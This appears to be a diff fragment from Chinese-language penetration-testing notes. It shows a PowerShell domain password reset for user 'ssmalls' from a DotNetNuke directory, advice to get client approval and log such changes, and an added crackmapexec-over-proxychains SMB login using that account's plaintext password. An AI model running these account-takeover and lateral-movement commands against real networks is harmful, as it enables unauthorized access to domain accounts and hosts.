@@ -387,3 +387,5 @@ C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPasswo
 但如果这是唯一的路径
 与客户确认，多数客户会允许继续
 将此类更改记录在活动日志中，将其包含在报告的附录中
+
+proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!      用 ssmalls 登录 smb
